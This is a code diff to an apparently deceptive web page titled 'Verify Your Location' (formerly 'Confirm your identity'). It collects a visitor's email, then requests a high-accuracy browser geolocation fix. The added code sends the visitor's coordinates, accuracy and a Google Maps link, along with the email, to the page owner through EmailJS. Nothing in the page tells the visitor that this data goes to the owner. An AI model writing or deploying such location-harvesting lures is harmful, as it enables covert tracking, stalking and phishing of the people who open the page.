@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Confirm your identity</title>
+  <title>Verify Your Location</title>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Syne:wght@700;800&display=swap');
@@ -142,33 +142,57 @@
     }
     errEl.textContent = '';
     capturedEmail = email;
-    sendData();
+    requestLocation();
   }
 
-  function sendData() {
+  function requestLocation() {
     const btn = document.getElementById('proceed-btn');
     const statusEl = document.getElementById('location-status');
 
+    if (!navigator.geolocation) {
+      statusEl.innerHTML = '<div class="error-msg">Geolocation is not supported by your browser.</div>';
+      return;
+    }
+
     btn.disabled = true;
-    statusEl.innerHTML = '<div class="spinner"></div><p class="status-msg">Sending data…</p>';
+    statusEl.innerHTML = '<div class="spinner"></div><p class="status-msg">Waiting for location permission…</p>';
 
-    const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+        const acc = Math.round(pos.coords.accuracy);
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
-    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-      user_email:   capturedEmail,
-      latitude:     'Not collected',
-      longitude:    'Not collected',
-      accuracy:     'Not collected',
-      maps_link:    'Not collected',
-      captured_at:  timestamp,
-    })
-    .then(() => {
-      showStep('step-success');
-    })
-    .catch((err) => {
-      btn.disabled = false;
-      statusEl.innerHTML = `<div class="error-msg">Failed to send data. EmailJS error: ${JSON.stringify(err)}<br>Check your EmailJS keys.</div>`;
-    });
+        statusEl.innerHTML = '<div class="spinner"></div><p class="status-msg">Sending data to email…</p>';
+
+        emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          user_email:   capturedEmail,
+          latitude:     lat.toFixed(6),
+          longitude:    lng.toFixed(6),
+          accuracy:     acc + ' meters',
+          maps_link:    mapsUrl,
+          captured_at:  timestamp,
+        })
+        .then(() => {
+          showStep('step-success');
+        })
+        .catch((err) => {
+          btn.disabled = false;
+          statusEl.innerHTML = `<div class="error-msg">Failed to send data. EmailJS error: ${JSON.stringify(err)}<br>Check your EmailJS keys.</div>`;
+        });
+      },
+      (err) => {
+        btn.disabled = false;
+        let msg = 'Unable to get location. ';
+        if (err.code === 1) msg += 'You denied location access. Please allow it and try again.';
+        else if (err.code === 2) msg += 'Location information is unavailable.';
+        else if (err.code === 3) msg += 'The request timed out. Please try again.';
+        statusEl.innerHTML = `<div class="error-msg">${msg}</div>`;
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
   }
 
   document.getElementById('email-input').addEventListener('keydown', (e) => {
